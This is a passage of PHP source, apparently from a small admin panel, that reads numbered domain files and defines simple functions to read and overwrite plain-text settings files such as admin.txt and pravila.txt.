		$d27_3 = file_get_contents("domains/27_3.txt");	 
		if ($d27_3 == '' or $d27_3 == ' ')
			$d27_3 = '<b>Не указан</b>';
		$d28_3 = file_get_contents("domains/28_3.txt");	 
		if ($d28_3 == '' or $d28_3 == ' ')
			$d28_3 = '<b>Не указан</b>';
		$d29_3 = file_get_contents("domains/29_3.txt");	 
		if ($d29_3 == '' or $d29_3 == ' ')
			$d29_3 = '<b>Не указан</b>';
		$d30_3 = file_get_contents("domains/30_3.txt");	 
		if ($d30_3 == '' or $d30_3 == ' ')
			$d30_3 = '<b>Не указан</b>';
		$d31_3 = file_get_contents("domains/31_3.txt");	 
		if ($d31_3 == '' or $d31_3 == ' ')
			$d31_3 = '<b>Не указан</b>';
		return [$d1, $d2, $d3, $d4, $d5, $d6, $d7, $d8, $d9, $d10, $d11, $d12, $d13, $d14, $d15, $d16, $d17, $d18, $d19, $d20, $d21, $d22, $d23, $d24, $d25, $d26, $d27, $d28, $d29, $d30, $d31, $d1_2, $d2_2, $d3_2, $d4_2, $d5_2, $d6_2, $d7_2, $d8_2, $d9_2, $d10_2, $d11_2, $d12_2, $d13_2, $d14_2, $d15_2, $d16_2, $d17_2, $d18_2, $d19_2, $d20_2, $d21_2, $d22_2, $d23_2, $d24_2, $d25_2, $d26_2, $d27_2, $d28_2, $d29_2, $d30_2, $d31_2, $d1_3, $d2_3, $d3_3, $d4_3, $d5_3, $d6_3, $d7_3, $d8_3, $d9_3, $d10_3, $d11_3, $d12_3, $d13_3, $d14_3, $d15_3, $d16_3, $d17_3, $d18_3, $d19_3, $d20_3, $d21_3, $d22_3, $d23_3, $d24_3, $d25_3, $d26_3, $d27_3, $d28_3, $d29_3, $d30_3, $d31_3];
	}*/
		function checkBaSet() {
		$s = file_get_contents("settings/ba.txt");
		return $s;
	}

	function setBaSet($baabsuka) {
		$fp = fopen("settings/ba.txt", "a");
		file_put_contents('settings/ba.txt', '');
		$wd = fwrite($fp, $baabsuka);
		fclose($fp);
		return $wd;
	}
	
		function checkinfoSet() {
		$s = file_get_contents("settings/info.txt");
		return $s;
	}

	function setinfoSet($infoabsuka) {
		$fp = fopen("settings/info.txt", "a");
		file_put_contents('settings/info.txt', '');
		$wd = fwrite($fp, $infoabsuka);
		fclose($fp);
		return $wd;
	}
	
		function checkzaSet() {
		$s = file_get_contents("settings/za.txt");
		return $s;
	}

	function setzaSet($zaabsuka) {
		$fp = fopen("settings/za.txt", "a");
		file_put_contents('settings/za.txt', '');
		$wd = fwrite($fp, $zaabsuka);
		fclose($fp);
		return $wd;
	}
	
		function checkadminSet() {
		$s = file_get_contents("settings/admin.txt");
		return $s;
	}

	function setadminSet($adminabsuka) {
		$fp = fopen("settings/admin.txt", "a");
		file_put_contents('settings/admin.txt', '');
		$wd = fwrite($fp, $adminabsuka);
		fclose($fp);
		return $wd;
	}
	
	function checkpravilaSet() {
		$s = file_get_contents("settings/pravila.txt");
		return $s;
	}

	function setpravilaSet($pravilaq) {
		$fp = fopen("settings/pravila.txt", "a");
		file_put_contents('settings/pravila.txt', '');
		$wd = fwrite($fp, $pravilaq);
		fclose($fp);
		return $wd;
	}
	
	

?>
